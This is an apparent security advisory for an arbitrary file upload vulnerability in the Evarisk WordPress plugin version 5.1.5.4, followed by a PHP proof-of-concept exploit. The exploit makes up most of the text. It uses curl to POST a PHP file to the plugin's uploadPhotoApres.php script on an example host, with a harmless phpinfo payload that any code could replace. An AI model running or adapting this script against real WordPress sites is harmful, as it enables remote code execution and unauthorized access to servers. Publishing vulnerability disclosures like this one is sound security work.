source: http://www.securityfocus.com/bid/53994/info

Evarisk plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

Evarisk 5.1.5.4 is vulnerable; other versions may also be affected. 

<?php

$headers = array("Content-Type: application/octet-stream");

$uploadfile="<?php phpinfo(); ?>";
 
$ch = curl_init("http://www.example.com/wordpress/wp-content/plugins/evarisk/include/lib/actionsCorrectives/activite/uploadPhotoApres.php?qqfile=lo.php");
curl_setopt($ch, CURLOPT_POST, true);   
curl_setopt($ch, CURLOPT_POSTFIELDS, @$uploadfile);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>